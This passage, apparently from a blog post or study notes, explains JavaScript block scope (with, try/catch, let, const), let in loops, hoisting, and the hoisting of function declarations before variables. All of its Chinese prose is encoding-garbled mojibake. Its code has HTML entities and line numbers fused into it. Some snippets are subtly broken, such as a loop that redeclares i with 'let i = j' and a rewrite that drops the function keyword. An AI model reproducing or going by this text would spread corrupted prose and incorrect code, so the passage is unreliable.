i++)&#123; console.log(i);&#125; ä¸ºä»€ä¹ˆè¦æŠŠä¸€ä¸ªåªåœ¨ for å¾ªçŽ¯å†…éƒ¨ä½¿ç”¨ï¼ˆè‡³å°‘æ˜¯åº”è¯¥åªåœ¨å†…éƒ¨ä½¿ç”¨ï¼‰çš„å˜é‡ i æ±¡æŸ“åˆ°æ•´ä¸ªå‡½æ•°ä½œç”¨åŸŸä¸­ï¼Ÿæ›´é‡è¦çš„æ˜¯ï¼Œå¼€å‘è€…éœ€è¦æ£€æŸ¥è‡ªå·±çš„ä»£ç ï¼Œä»¥é¿å…åœ¨ä½œç”¨èŒƒå›´æ„å¤–åœ°ä½¿ç”¨ï¼ˆæˆ–å¤ç”¨ï¼‰æŸäº›å˜é‡ï¼Œå¦‚æžœåœ¨é”™è¯¯çš„åœ°æ–¹ä½¿ç”¨å˜é‡å°†å¯¼è‡´æœªçŸ¥å˜é‡çš„å¼‚å¸¸ã€‚å˜é‡çš„ i çš„ä½œç”¨åŸŸï¼ˆå¦‚æžœå­˜åœ¨çš„è¯ï¼‰å°†ä½¿å¾—å…¶åªèƒ½åœ¨ for å¾ªçŽ¯å†…éƒ¨ä½¿ç”¨ï¼Œå¦‚æžœåœ¨å‡½æ•°å…¶ä»–åœ°æ–¹ä½¿ç”¨ä¼šå¯¼è‡´é”™è¯¯ï¼Œè¿™å¯¹ä¿è¯å˜é‡ä¸ä¼šè¢«æ··ä¹±åœ°å¤ç”¨åŠæå‡ä»£ç çš„å¯ç»´æŠ¤æ€§éƒ½æœ‰å¾ˆå¤§å¸®åŠ©ã€‚ ä½†å¯æƒœä»Žè¡¨é¢ä¸Š jsæ²¡æœ‰å—ä½œç”¨åŸŸçš„ç›¸å…³åŠŸèƒ½ï¼Œé™¤éžæ›´æ·±å…¥åœ°ç ”ç©¶ withwithä¸ä»…æ˜¯ä¸€ä¸ªéš¾ä»¥ç†è§£çš„ç»“æž„ï¼Œä¹Ÿæ˜¯å—ä½œç”¨åŸŸçš„ä¸€ä¸ªä¾‹å­ï¼ˆä¸€ç§å½¢å¼ï¼‰ï¼Œç”¨ with ä»Žå¯¹è±¡ä¸­åˆ›å»ºå‡ºçš„ä½œç”¨åŸŸä»…åœ¨ with å£°æ˜Žä¸­è€Œéžå¤–éƒ¨ä½œç”¨åŸŸæœ‰æ•ˆã€‚ try/catchES3 è§„èŒƒä¸­ try/catch çš„ catch åˆ†å¥ä¼šåˆ›å»ºä¸€ä¸ªå—ä½œç”¨åŸŸï¼Œå…¶ä¸­å£°æ˜Žçš„å˜é‡ä»…åœ¨ catch å†…éƒ¨æœ‰æ•ˆã€‚ ä¾‹å¦‚ï¼š 123456try&#123; undefined(); //æ‰§è¡Œéžæ³•æ“ä½œäº§ç”Ÿå¼‚å¸¸&#125;catch(err)&#123; console.log(err); // èƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œ&#125;console.log(err); // ReferenceError: err not found å°½ç®¡è¿™ä¸ªè¡Œä¸ºå·²è¢«æ ‡å‡†åŒ–ï¼Œå¹¶ä¸”è¢«å¤§éƒ¨åˆ†çš„æ ‡å‡† JavaScript çŽ¯å¢ƒæ‰€æ”¯æŒï¼Œä½†æ˜¯å½“åŒä¸€ä¸ªä½œç”¨åŸŸä¸­çš„ä¸¤ä¸ªæˆ–è€…å¤šä¸ª catch åˆ†å¥ç”¨åŒæ ·çš„æ ‡è¯†ç¬¦åç§°å£°æ˜Žé”™è¯¯å˜é‡æ—¶ï¼Œå¾ˆå¤šé™æ€æ£€æŸ¥è¿˜æ˜¯ä¼šå‘å‡ºè­¦å‘Šã€‚å®žé™…ä¸Šè¿™å¹¶ä¸æ˜¯é‡å¤å®šä¹‰ï¼Œå› ä¸ºæ‰€æœ‰å˜é‡éƒ½è¢«å®‰å…¨åœ°é™åˆ¶åœ¨å—ä½œç”¨åŸŸå†…éƒ¨ï¼Œä½†æ˜¯é™æ€æ£€æŸ¥å·¥å…·è¿˜æ˜¯ä¼šå¾ˆçƒ¦äººåœ°å‘å‡ºè­¦å‘Š ä¸ºäº†é¿å…è¿™ä¸ªä¸å¿…è¦çš„é”™è¯¯ï¼Œå¾ˆå¤šå¼€å‘è€…ä¼šå°† catch çš„å‚æ•°å‘½åä¸º err1/err2 ç­‰ï¼Œä¹Ÿæœ‰ç›´æŽ¥å…³é—­äº†é™æ€æ£€æŸ¥å·¥å…·å¯¹é‡å¤å˜é‡åçš„æ£€æŸ¥ã€‚ letES6 å¼•å…¥äº†æ–°çš„ let å…³é”®å­—ï¼Œæä¾›äº†é™¤ var ä»¥å¤–çš„å¦ä¸€ç§å˜é‡å£°æ˜Žæ–¹å¼ã€‚ let å…³é”®å­—å¯ä»¥å°†å˜é‡ç»‘å®šåˆ°æ‰€åœ¨çš„ä»»æ„ä½œç”¨åŸŸä¸­ï¼ˆé€šå¸¸æ˜¯{..}å†…éƒ¨ï¼‰ã€‚æ¢å¥è¯è¯´ï¼Œlet ä¸ºå…¶å£°æ˜Žçš„å˜é‡éšå¼åœ°åŠ«æŒäº†æ‰€åœ¨çš„å—ä½œç”¨åŸŸã€‚ 12345678var foo = true;if(foo)&#123; let bar = foo * 2; bar = something(bar); console.log(bar);&#125;console.log(bar) // ReferenceError ç”¨ let å°†å˜é‡é™„åŠ åœ¨ä¸€ä¸ªå·²ç»å­˜åœ¨çš„å—ä½œç”¨åŸŸä¸Šçš„è¡Œä¸ºæ˜¯éšå¼çš„ï¼Œåœ¨å¼€å‘å’Œä¿®æ”¹ä»£ç çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æžœæ²¡æœ‰å¯†åˆ‡å…³æ³¨å“ªäº›ä½œç”¨åŸŸä¸­æœ‰ç»‘å®šå˜é‡ï¼Œå¹¶ä¸”ä¹ æƒ¯åœ°ç§»åŠ¨è¿™äº›å—æˆ–è€…å°†å…¶åŒ…å«åœ¨å…¶ä»–å—ä¸­ï¼Œå°±ä¼šå¯¼è‡´ä»£ç çš„æ··ä¹±ã€‚ ä¸ºå—ä½œç”¨åŸŸæ˜¾å¼åœ°åˆ›å»ºå—å¯ä»¥éƒ¨åˆ†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæ˜¯å˜é‡çš„é™„å±žå…³ç³»å˜å¾—æ›´åŠ æ¸…æ™°ã€‚é€šå¸¸æ¥å°†ï¼Œæ˜¾å¼çš„ä»£ç ç”±äºŽéšå¼æˆ–ä¸€äº›ç²¾å·§ä½†ä¸æ¸…æ™°çš„ä»£ç ã€‚æ˜¾å¼çš„å—ä½œç”¨åŸŸé£Žæ ¼éžå¸¸å®¹æ˜“ä¹¦å†™ï¼Œå¹¶ä¸”å’Œå…¶ä»–è¯­è¨€ä¸­çš„å—ä½œç”¨åŸŸå·¥ä½œåŽŸç†ä¸€æ ·ï¼š 123456789var foo = true;if(foo)&#123; &#123; // æ˜¾å¼çš„å— let bar = foo * 2; bar = something(bar); console.log(bar); &#125;&#125;console.log(bar) // ReferenceError åªè¦å£°æ˜Žæ˜¯æœ‰æ•ˆçš„ï¼Œåœ¨å£°æ˜Žä¸­çš„ä»»ä½•ä½ç½®éƒ½å¯ä»¥ç”¨{..}æ‹¬å·æ¥ä¸º let åˆ›å»ºä¸€ä¸ªç”¨äºŽç»‘å®šçš„å—ã€‚è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åœ¨ if å£°æ˜Žå†…éƒ¨æ˜¾å¼åœ°åˆ›å»ºäº†ä¸€ä¸ªå—ï¼Œå¦‚æžœéœ€è¦å¯¹å…¶è¿›è¡Œé‡æž„ï¼Œæ•´ä¸ªå—éƒ½å¯ä»¥è¢«æ–¹ä¾¿åœ°ç§»åŠ¨è€Œä¸ä¼šå¯¹å¤–éƒ¨ if å£°æ˜Žçš„ä½ç½®å’Œè¯­ä¹‰äº§ç”Ÿä»»ä½•å½±å“ã€‚ ä¸‹é¢ä¼šè®²åˆ°æå‡ï¼Œæå‡æ˜¯æŒ‡å£°æ˜Žä¼šè¢«è§†ä¸ºå­˜åœ¨äºŽå…¶æ‰€å‡ºçŽ°çš„ä½œç”¨åŸŸçš„æ•´ä¸ªèŒƒå›´å†…ã€‚ ä½†æ˜¯ä½¿ç”¨ let è¿›è¡Œå£°æ˜Žä¸ä¼šåœ¨å—ä½œç”¨åŸŸä¸­è¿›è¡Œæå‡ã€‚å£°æ˜Žçš„ä»£ç è¢«è¿è¡Œä¹‹å‰ï¼Œå£°æ˜Žå¹¶ä¸â€å­˜åœ¨â€ã€‚ 1234&#123; console.log(bar); // ReferenceError let bar = 2;&#125; 1.åžƒåœ¾æ”¶é›† å¦ä¸€ä¸ªå—ä½œç”¨åŸŸéžå¸¸æœ‰ç”¨çš„åŽŸå› å’Œé—­åŒ…åŠå›žæ”¶å†…å­˜åžƒåœ¾æœºåˆ¶ç›¸å…³ã€‚è€Œå†…éƒ¨çš„å®žçŽ°ï¼Œå°±æ˜¯é—­åŒ…çš„æœºåˆ¶ä¼šåœ¨åŽé¢è®²åˆ°ã€‚ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 12345678910function process(data)&#123; // doSomething&#125;var someReallyBigData = &#123;..&#125;;process(someReallyBigData);var btn = document.getElementById('my_button');btn.addEventListener('click',function click(evt)&#123; console.log('button click');&#125;,/*capturingPhase=*/false); click å‡½æ•°çš„ç‚¹å‡»å›žè°ƒå¹¶ä¸éœ€è¦ someReallyBigData å˜é‡ï¼Œç†è®ºä¸Šè¿™æ„å‘³ç€å½“ process(..)æ‰§è¡ŒåŽï¼Œåœ¨å†…å­˜ä¸­å ç”¨å¤§é‡ç©ºé—´çš„æ•°æ®ç»“æž„å°±å¯ä»¥è¢«åžƒåœ¾å›žæ”¶äº†ã€‚ä½†æ˜¯ï¼Œç”±äºŽ click å‡½æ•°å½¢æˆäº†ä¸€ä¸ªè¦†ç›–æ•´ä¸ªä½œç”¨åŸŸçš„é—­åŒ…ï¼ŒJavaScript å¼•æ“Žæžæœ‰å¯èƒ½ä¾ç„¶ä¿å­˜è¿™ä¸ªç»“æž„ï¼ˆå–å†³äºŽå…·ä½“å®žçŽ°ï¼‰ã€‚ å—ä½œç”¨åŸŸå¯ä»¥æ‰“æ¶ˆè¿™ç§é¡¾è™‘ï¼Œå¯ä»¥è®©å¼•æ“Žæ¸…æ¥šåœ°çŸ¥é“æ²¡æœ‰å¿…è¦ç»§ç»­ä¿å­˜ someReallyBigDataäº†ï¼š 12345678910111213function process(data)&#123; // doSomething&#125;// è¿™ä¸ªå—ä¸­å®šä¹‰çš„å†…å®¹å®Œäº‹å°±å¯ä»¥é”€æ¯äº†&#123; var someReallyBigData = &#123;..&#125;; process(someReallyBigData);&#125;var btn = document.getElementById('my_button');btn.addEventListener('click',function click(evt)&#123; console.log('button click');&#125;,/*capturingPhase=*/false); ä¸ºä»£ç æ˜¾å¼å£°æ˜Žå—ä½œç”¨åŸŸï¼Œå¹¶å¯¹å˜é‡è¿›è¡Œæœ¬åœ°ç»‘å®šæ˜¯éžå¸¸æœ‰ç”¨çš„å·¥å…·ï¼Œå¯ä»¥æŠŠå®ƒæ·»åŠ åˆ°ä½ çš„ä»£ç å·¥å…·ç®±ä¸­äº†ã€‚ 2.letå¾ªçŽ¯ ä¸€ä¸ª let å¾ªçŽ¯å¯ä»¥å‘æŒ¥ä¼˜åŠ¿çš„å…¸åž‹ä¾‹å­å°±æ˜¯ä¹‹å‰è®¨è®ºçš„ for å¾ªçŽ¯ 1234for(let i = 0;i &lt; 10;i++)&#123; console.log(i);&#125;console.log(i); // ReferenceError for å¾ªçŽ¯å¤´éƒ¨çš„ let ä¸ä»…å°† i ç»‘å®šåˆ°äº† for å¾ªçŽ¯çš„å—ä¸­ï¼Œäº‹å®žä¸Šå®ƒå°†å…¶é‡æ–°ç»‘å®šåˆ°äº†å¾ªçŽ¯çš„æ¯ä¸€ä¸ªè¿­ä»£ä¸­ï¼Œç¡®ä¿ä½¿ç”¨ä¸Šä¸€ä¸ªå¾ªçŽ¯è¿­ä»£ç»“æŸæ—¶çš„å€¼é‡æ–°è¿›è¡Œèµ‹å€¼ã€‚ä¸‹é¢é€šè¿‡å¦ä¸€ç§æ–¹å¼æ¥è¯´æ˜Žè¿­ä»£æ—¶è¿›è¡Œé‡æ–°ç»‘çš„è¡Œä¸ºï¼š 12345678&#123; let j; for(let i = 0;i &lt; 10;i++)&#123; let i = j; //æ¯ä¸ªè¿­ä»£é‡æ–°ç»‘å®š console.log(i); &#125;&#125;//ç”±äºŽ let å£°æ˜Žé™„å±žäºŽä¸€ä¸ªæ–°çš„ä½œç”¨åŸŸè€Œä¸æ˜¯å½“å‰çš„å‡½æ•°ä½œç”¨åŸŸï¼ˆä¹Ÿä¸å±žäºŽå…¨å±€ä½œç”¨åŸŸï¼‰ï¼Œå½“ä»£ç ä¸­å­˜åœ¨å¯¹äºŽå‡½æ•°ä½œç”¨åŸŸä¸­ var å£°æ˜Žçš„éšå¼ä¾èµ–æ—¶ï¼Œå°±ä¼šæœ‰å¾ˆå¤šéšè—çš„é™·é˜±ï¼Œå¦‚æžœç”¨ let æ¥æ›¿ä»£ var åˆ™éœ€è¦åœ¨ä»£ç é‡æž„çš„è¿‡ç¨‹ä¸­ä»˜å‡ºé¢å¤–çš„ç²¾åŠ›ã€‚ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 123456789101112131415161718192021222324252627var foo = true, baz = 10;if(foo)&#123; var bar = 3; if(baz &gt; bar)&#123; console.log(baz) &#125;&#125;//é‡æž„ä¸ºåŒç­‰å½¢å¼var foo = true, baz = 10;if(foo)&#123; var bar = 3; // ..&#125;if(baz &gt; bar)&#123; console.log(baz)&#125;// ä½†æ˜¯åœ¨ä½¿ç”¨å—çº§ä½œç”¨åŸŸçš„å˜é‡æ—¶éœ€è¦æ³¨æ„ä¸‹é¢çš„å˜åŒ–ï¼švar foo = true, baz = 10;if(foo)&#123; let bar = 3; if(baz &gt; bar)&#123; //ç§»åŠ¨ä»£ç ä¸è¦å¿˜äº† bar console.log(baz) &#125;&#125; consté™¤äº† let ä¹‹å¤–ï¼ŒES6 è¿˜å¼•å…¥äº† const ï¼Œç»Ÿä¸€å¯ä»¥ç”¨æ¥åˆ›å»ºå—ä½œç”¨åŸŸå˜é‡ï¼Œä½†å…¶å€¼æ˜¯å›ºå®šçš„ï¼ˆå¸¸é‡ï¼‰ã€ä¹‹åŽä»»ä½•è¯•å›¾ä¿®æ”¹å€¼çš„æ“ä½œéƒ½ä¼šå¼•èµ·é”™è¯¯ã€‚ 123456789var foo = true;if(foo)&#123; var a = 3; const b = 3; // åŒ…å«åœ¨ ifä¸­çš„å—ä½œç”¨åŸŸå¸¸é‡ a = 3; //æ­£å¸¸ b = 4; //é”™è¯¯&#125;console.log(a); // 3console.log(b); // ReferenceError å°ç»“å‡½æ•°æ˜¯ JavaScript ä¸­æœ€å¸¸è§çš„ä½œç”¨åŸŸå•å…ƒï¼Œæœ¬è´¨ä¸Šï¼Œå£°æ˜Žåœ¨ä¸€ä¸ªå‡½æ•°å†…éƒ¨çš„å˜é‡æˆ–å‡½æ•°ä¼šåœ¨æ‰€å¤„çš„ä½œç”¨åŸŸä¸­â€œéšè—â€èµ·æ¥ï¼Œåªæ˜¯æœ‰æ„ä¸ºä¹‹çš„è‰¯å¥½è½¯ä»¶çš„è®¾è®¡åŽŸåˆ™ ä½†å‡½æ•°ä¸æ˜¯å”¯ä¸€çš„ä½œç”¨åŸŸå•å…ƒã€‚å—ä½œç”¨åŸŸæŒ‡çš„æ˜¯å˜é‡å’Œå‡½æ•°ä¸ä»…å¯ä»¥å±žäºŽæ‰€å¤„çš„ä½œç”¨åŸŸï¼Œä¹Ÿå¯ä»¥å±žäºŽæŸä¸ªä»£ç å—ï¼ˆé€šå¸¸æŒ‡{..}å†…éƒ¨ï¼‰ ä»Ž ES3å¼€å§‹ï¼Œtry/catch ç»“æž„åœ¨ catch åˆ†å¥ä¸­å…·æœ‰ä½œç”¨åŸŸã€‚ åœ¨ES6 ä¸­å¼•å…¥äº† let å…³é”®å­—ï¼Œç”¨æ¥åœ¨ä»»æ„ä»£ç å—ä¸­å£°æ˜Žå˜é‡ 1if(..)&#123;let a = 2;&#125; ä¸Šé¢çš„å£°æ˜ŽåŠ«æŒäº†ä¸€ä¸ª if çš„ {..}å—çš„å˜é‡ï¼Œå¹¶ä¸”å°†å˜é‡æ·»åŠ åˆ°è¿™ä¸ªå—ä¸­ã€‚ æœ‰äº›äººè®¤ä¸ºå—ä½œç”¨åŸŸä¸åº”è¯¥å®Œå…¨ä½œä¸ºå‡½æ•°ä½œç”¨åŸŸçš„æ›¿ä»£æ–¹æ¡ˆã€‚ä¸¤ç§åŠŸèƒ½åº”è¯¥åŒæ—¶å­˜åœ¨ï¼Œå¼€å‘è€…å¯ä»¥å¹¶ä¸”ä¹Ÿåº”è¯¥æ ¹æ®éœ€è¦é€‰æ‹©ä½¿ç”¨ä½•ç§ä½œç”¨åŸŸï¼Œåˆ›å»ºå¯è¯»ã€å¯ç»´æŠ¤çš„ä¼˜è‰¯ä»£ç ã€‚ æå‡çŽ°åœ¨å·²ç»å¤§æ¦‚çŸ¥é“äº†ä½œç”¨åŸŸçš„æ¦‚å¿µï¼Œå·²ç»æ ¹æ®å£°æ˜Žçš„ä½ç½®å’Œæ–¹å¼å°†å˜é‡åˆ†é…ç»™ä½œç”¨åŸŸçš„ç›¸å…³åŽŸç†äº†ã€‚å‡½æ•°ä½œç”¨åŸŸå’Œå—ä½œç”¨åŸŸçš„è¡Œä¸ºæ˜¯ä¸€æ ·çš„ï¼Œå¯ä»¥æ€»ç»“ä¸ºï¼šä»»ä½•å£°æ˜Žåœ¨æŸä¸ªä½œç”¨åŸŸå†…çš„å˜é‡ï¼Œéƒ½å°†é™„å±žè¿™ä¸ªä½œç”¨åŸŸã€‚ ä½†æ˜¯ä½œç”¨åŸŸåŒå…¶ä¸­çš„å˜é‡å£°æ˜Žå‡ºçŽ°çš„ä½ç½®æœ‰æŸç§å¾®å¦™çš„å…³ç³»ï¼Œä¸‹é¢å°†æ¥è®¨è®ºä¸€ä¸‹è¿™ä¸ªç»†èŠ‚ã€‚ å…ˆæœ‰é¸¡è¿˜æ˜¯å…ˆæœ‰è›‹ç›´è§‰ä¸Šä¼šè®¤ä¸º JavaScript ä»£ç åœ¨æ‰§è¡Œæ—¶æ˜¯ç”±ä¸Šåˆ°ä¸‹ä¸€è¡Œä¸€è¡Œæ‰§è¡Œçš„ã€‚ä½†å®žé™…ä¸Šè¿™å¹¶ä¸æ˜¯å®Œå…¨æ­£ç¡®ï¼Œæœ‰ä¸€ç§ç‰¹æ®Šæƒ…å†µä¼šå¯¼è‡´è¿™ä¸ªå‡è®¾é”™è¯¯çš„ã€‚çœ‹ä¸‹é¢çš„ä»£ç ï¼š 123a = 2;var a;console.log(a); ä¸Šé¢è¿™ä¸ªç­”æ¡ˆä¼šè¾“å‡ºä»€ä¹ˆï¼Ÿå› ä¸ºvar a å£°æ˜Žåœ¨ a = 2ä¹‹åŽï¼Œä»–ä»¬è‡ªç„¶è€Œç„¶åœ°è®¤ä¸ºå˜é‡æ˜¯è¢«é‡æ–°èµ‹å€¼äº†ï¼Œå› æ­¤ä¼šè¢«èµ‹å€¼é»˜è®¤å€¼ undefined ï¼Œä½†æ˜¯å…¶å®žçœŸæ­£è¾“å‡ºçš„ç»“æžœæ˜¯ 2ã€‚é‚£ä¹ˆä¸‹é¢çš„ä»£ç ä¼šè¾“å‡ºä»€ä¹ˆï¼Ÿ 12console.log(a);var a = 2; ç­”æ¡ˆæ˜¯ undefinedã€‚ ç¼–è¯‘å™¨å†åº¦æ¥è¢­ä¹‹å‰æœ‰è®²åˆ°ï¼Œå¼•æ“Žä¼šåœ¨è§£é‡Š JavaScript ä»£ç ä¹‹å‰å…ˆå¯¹å…¶è¿›è¡Œç¼–è¯‘ã€‚ç¼–è¯‘é˜¶æ®µä¸­çš„ä¸€éƒ¨åˆ†å·¥ä½œå°±æ˜¯æ‰¾åˆ°æ‰€æœ‰çš„å£°æ˜Žï¼Œå¹¶ç”¨åˆé€‚çš„ä½œç”¨åŸŸå°†å®ƒä»¬å…³è”èµ·æ¥ã€‚æ‰€æœ‰ï¼Œæ­£ç¡®çš„æ€è€ƒæ€è·¯æ˜¯ï¼ŒåŒ…æ‹¬å˜é‡å’Œå‡½æ•°åœ¨å†…çš„æ‰€æœ‰å£°æ˜Žéƒ½ä¼šåœ¨ä»»ä½•ä»£ç è¢«æ‰§è¡Œå‰é¦–å…ˆè¢«å¤„ç†ã€‚ å½“ä½ çœ‹åˆ° var a = 2;æ—¶ï¼Œå¯èƒ½ä¼šè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå£°æ˜Žï¼Œä½† JavaScript å®žé™…ä¸Šä¼šå°†å…¶çœ‹æˆä¸¤ä¸ªå£°æ˜Žï¼švar a;å’Œ a = 2ï¼›ã€‚ç¬¬ä¸€ä¸ªå®šä¹‰å£°æ˜Žæ˜¯åœ¨ç¼–è¯‘é˜¶æ®µè¿›è¡Œçš„ã€‚ç¬¬äºŒä¸ªèµ‹å€¼å£°æ˜Žä¼šè¢«ç•™åœ¨åŽŸåœ°ç­‰å¾…æ‰§è¡Œé˜¶æ®µã€‚ æ‰€ä»¥ä¸Šé¢çš„ç¬¬ä¸€æ®µä»£ç ä¼šè¢«å¤„ç†ä¸ºï¼š 123var a;a = 2;console.log(a); ç¬¬äºŒæ®µä»£ç ï¼š 123var a;console.log(a);a = 2; å› ä¸ºè¿™ä¸ªè¿‡ç¨‹å°±åƒå˜é‡å’Œå‡½æ•° å£°æ˜Žä»Žå®ƒä»¬åœ¨ä»£ç ä¸­å‡ºçŽ°çš„ä½ç½®è¢«â€œç§»åŠ¨â€åˆ°äº†æœ€ä¸Šé¢ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±å«åšæå‡ã€‚ æ¢å¥è¯è¯´ï¼ŒçŽ°æœ‰è›‹ï¼ˆå£°æ˜Žï¼‰åŽåˆé¸¡ï¼ˆèµ‹å€¼ï¼‰ã€‚ åªæœ‰å£°æ˜Žæœ¬èº«ä¼šè¢«æå‡ï¼Œè€Œèµ‹å€¼æˆ–å…¶ä»–è¿è¡Œé€»è¾‘ä¼šç•™åœ¨åŽŸåœ°ï¼Œå¦‚æžœæå‡æ”¹å˜äº†ä»£ç çš„æ‰§è¡Œçš„é¡ºåºï¼Œä¼šé€ æˆéžå¸¸ä¸¥é‡çš„ç ´åã€‚ 123456789foo();function foo()&#123; console.log(a); // undefined var a = 2;&#125; foo å‡½æ•°çš„å£°æ˜Žï¼ˆè¿™ä¸ªä¾‹å­è¿˜åŒ…å«å®žé™…å‡½æ•°çš„éšå«å€¼ï¼‰è¢«æå‡äº†ï¼Œå› æ­¤ç¬¬ä¸€è¡Œä¸­çš„è°ƒç”¨å¯ä»¥æ­£å¸¸æ‰§è¡Œã€‚ å¦å¤–å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæ¯ä¸ªä½œç”¨åŸŸéƒ½ä¼šè¿›è¡Œæå‡æ“ä½œã€‚å°½ç®¡å‰é¢å¤§éƒ¨åˆ†ä»£ç ç‰‡æ®µå·²ç»ç®€åŒ–äº†ï¼ˆå› ä¸ºå®ƒä»¬åªåŒ…å«å…¨å±€ä½œç”¨åŸŸï¼‰ï¼Œè€Œæˆ‘ä»¬æ‰€è¯´çš„ foo(â€¦)å‡½æ•°è‡ªèº«ä¹Ÿä¼šåœ¨å†…éƒ¨å¯¹ var a è¿›è¡Œæå‡ï¼ˆæ˜¾ç„¶ä¸æ˜¯æå‡åˆ°æ•´ä¸ªç¨‹åºçš„æœ€ä¸Šæ–¹ï¼‰å› ä¸ºè¿™æ®µä»£ç å®žé™…ä¸Šä¹Ÿä¼šè¢«ç†è§£æˆä¸‹é¢çš„å½¢å¼ã€‚ 1234567function foo()&#123; var a; console.log(a); // undefined a = 2;&#125;foo(); å¯ä»¥çœ‹åˆ°ï¼Œå‡½æ•°å£°æ˜Žä¼šè¢«æå‡ï¼Œä½†æ˜¯å‡½æ•°è¡¨è¾¾å¼å´ä¸ä¼šè¢«æå‡ 1234foo(); // ä¸æ˜¯ RefenceErrorï¼Œè€Œæ˜¯ TypeError!var foo = function bar()&#123; //...&#125; è¿™æ®µç¨‹åºä¸­å˜é‡æ ‡è¯†ç¬¦ foo() è¢«æå‡å¹¶åˆ†é…åˆ°åˆ°æ‰€åœ¨ä½œç”¨åŸŸï¼ˆåœ¨è¿™é‡Œæ˜¯å…¨å±€ä½œç”¨åŸŸï¼‰ï¼Œå› æ­¤foo()ä¸ä¼šå¯¼è‡´ ReferenceError,ä½†æ˜¯ foo æ­¤æ—¶å¹¶æ²¡æœ‰è¢«èµ‹å€¼ï¼ˆå¦‚æžœå®ƒæ˜¯ä¸€ä¸ªå‡½æ•°å£°æ˜Žè€Œä¸æ˜¯å‡½æ•°è¡¨è¾¾å¼ï¼Œé‚£ä¹ˆå°±ä¼šèµ‹å€¼ï¼‰foo()ç”±äºŽå¯¹ undefined å€¼è¿›è¡Œå‡½æ•°è°ƒç”¨è€Œå¯¼è‡´éžæ³•æ“ä½œï¼Œå› ä¸ºæŠ›å‡º TypeError å¼‚å¸¸ã€‚åŒæ—¶ä¹Ÿè¦è®°ä½ï¼Œå³ä½¿æ˜¯å…·åçš„å‡½æ•°è¡¨è¾¾å¼ï¼Œåç§°æ ‡è¯†ç¬¦åœ¨èµ‹å€¼ä¹‹å‰ä¹Ÿæ— æ³•åœ¨æ‰€åœ¨ä½œç”¨åŸŸä¸­ä½¿ç”¨ï¼š 12345foo(); //TypeErrorbar(); //ReferenceErrorvar foo = function bar()&#123; //...&#125; ä¸Šé¢çš„ä»£ç ç»è¿‡æå‡åŽï¼Œå®žé™…ä¸Šä¼šè¢«ç†è§£æˆä¸‹é¢çš„å½¢å¼ï¼š 1234567var foo;foo(); //TypeErrorbar(); //ReferenceErrorfoo = function bar()&#123; var bar = ...self... //...&#125; å‡½æ•°ä¼˜å…ˆå‡½æ•°å£°æ˜Žå’Œå˜é‡å£°æ˜Žéƒ½ä¼šè¢«æå‡ï¼Œä½†æ˜¯ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„ç»†èŠ‚ï¼ˆè¿™ä¸ªç»†èŠ‚å¯ä»¥å‡ºçŽ°åœ¨ç”±å¤šä¸ªâ€œé‡å¤â€å£°æ˜Žçš„ä»£ç ä¸­ï¼‰æ˜¯å‡½æ•°é¦–å…ˆè¢«æå‡äº†ï¼Œç„¶åŽæ‰æ˜¯å˜é‡ã€‚æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 1234567891011121314151617foo(); //1var foo;function foo()&#123; console.log(1);&#125;foo = function()&#123; console.log(2);&#125;// ä¸ºä»€ä¹ˆä¼šè¾“å‡º1è€Œä¸æ˜¯2ï¼Œæ˜¯è¿™ä¸ªä»£ç ç‰‡æ®µä¼šè¢«å¼•æ“Žç†è§£ä¸ºå¦‚ä¸‹å½¢å¼ï¼šfoo()&#123; console.log(1);&#125;foo(); // 1foo = function()&#123; console.log(2);&#125; æ³¨æ„ï¼Œvar foo å°½ç®¡å‡ºçŽ°åœ¨function foo(â€¦)ä¹‹å‰ï¼Œä½†å®ƒæ˜¯é‡å¤çš„å£°æ˜Ž(å› æ­¤è¢«å¿½ç•¥äº†)ï¼Œå› ä¸ºå‡½æ•°å£°æ˜Žä¼šè¢«æå‡åˆ°æ™®é€šå˜é‡ä¹‹å‰ã€‚ å°½ç®¡é‡å¤çš„ var å£°æ˜Žä¼šè¢«å¿½ç•¥æŽ‰ï¼Œä½†å‡ºçŽ°åœ¨åŽé¢çš„å‡½æ•°å£°æ˜Žè¿˜æ˜¯å¯ä»¥è¦†ç›–å‰é¢çš„ã€‚ 12345678910foo(); // 3function foo()&#123; console.log(1);&#125;var foo = function()&#123; console.log(2);&#125;function foo()&#123; console.log(3);&#125; è™½ç„¶å¬èµ·æ¥éƒ½æ˜¯äº›æ— ç”¨çš„å­¦é™¢ç†è®ºï¼Œä½†æ˜¯å®ƒè¯´æ˜Žäº†åœ¨åŒä¸€ä¸ªä½œç”¨åŸŸä¸­è¿›è¡Œé‡å¤å®šä¹‰æ˜¯éžå¸¸ç³Ÿç³•çš„ï¼Œè€Œä¸”ç»å¸¸ä¼šå¯¼è‡´å„ç§å¥‡æ€ªçš„é—®é¢˜ã€‚ä¸€ä¸ªæ™®é€šå—å†…éƒ¨çš„å‡½æ•°å£°æ˜Žé€šå¸¸ä¼šè¢«æå‡åˆ°æ‰€åœ¨ä½œç”¨åŸŸçš„é¡¶éƒ¨ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸ä¼šåƒä¸‹é¢çš„ä»£ç æš—ç¤ºé‚£æ ·å¯ä»¥è¢«æ¡ä»¶åˆ¤æ–­æŽ§åˆ¶ï¼š 1234567foo(); // TypeError: foo is not a functionvar a = true;if(a)&#123; function foo()&#123;console.log("a"); &#125; &#125;else&#123; function foo()&#123;console.log("b"); &#125;&#125; ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªè¡Œä¸ºå¹¶ä¸å¯é ï¼Œåœ¨ JavaScriptæœªæ¥çš„ç‰ˆæœ¬ä¸­æœ‰å¯èƒ½ä¼šå‘ç”Ÿæ”¹å˜ï¼Œå› æ­¤åº”è¯¥å°½å¯èƒ½é¿å…åœ¨å—å†…éƒ¨å£°æ˜Žå‡½æ•°ã€‚ å°ç»“æˆ‘ä»¬ä¹ æƒ¯å°†var a = 2;çœ‹åšä¸€ä¸ªå£°æ˜Žï¼Œè€Œå®žé™…ä¸Š JavaScript 